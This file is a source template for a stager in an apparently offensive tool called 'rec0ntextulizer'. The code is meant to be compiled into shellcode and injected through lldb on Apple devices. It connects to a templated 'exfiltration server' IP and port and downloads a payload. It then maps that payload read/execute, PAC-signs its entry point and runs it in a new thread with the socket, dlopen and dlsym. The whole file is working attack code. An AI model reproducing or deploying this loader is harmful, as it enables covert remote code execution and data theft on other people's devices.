// A template populated by rec0ntextulizer,
// compiled into shellcode and executed
// using lldb's expression evaluator

// Expanded at load time for all sessions
#define PORT_NUMBER {PORT_NUMBER}
#define IP_ADDRESS "{IP_ADDRESS}"

// Device/session specific configuration, expanded right before evaluation
#define PTRAUTH_SIGN_UNAUTHENTICATED_FUNC(p) {{PAC_SIGN_FUNC}}
#define ARCH "{{ARCH}}"
#define SESSION_ID "{{SESSION_ID}}"


// connect to exfiltration server
int fd = socket(AF_INET, SOCK_STREAM, 0);
sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT_NUMBER);
addr.sin_addr.s_addr = inet_addr(IP_ADDRESS);
connect(fd, (struct sockaddr *)&addr, sizeof(sockaddr_in));

// send arch type
send(fd, ARCH, sizeof(ARCH) - 1, 0);

// receive payload size
uint64_t len = 0;
recv(fd, &len, sizeof(uint64_t), MSG_WAITALL);

// allocate buffer for payload
void *payload = NULL;
mach_port_t task = mach_task_self();
size_t size = ((mach_vm_offset_t)(len) + vm_page_mask) & ~((signed)vm_page_mask);
vm_allocate(task, (vm_address_t *)&payload, size, VM_FLAGS_ANYWHERE);

// recevie payload and write it to the allocated buffer
recv(fd, payload, len, MSG_WAITALL);

// set payload memory mapping as r^x
vm_protect(task, (vm_address_t)payload, size, 0, VM_PROT_READ | VM_PROT_EXECUTE);

// prepare args
void **args = (void **)malloc(sizeof(void *) * 5);
args[0] = (void *)payload;
args[1] = (void *)fd;
args[2] = (void *)strdup(SESSION_ID);
args[3] = (void *)dlopen;
args[4] = (void *)dlsym;

// execute payload in a new thread
void *(*payload_entry)(void *) = (void *(*)(void *))PTRAUTH_SIGN_UNAUTHENTICATED_FUNC(payload);
pthread_t thread;
pthread_create(&thread, NULL, payload_entry, args);
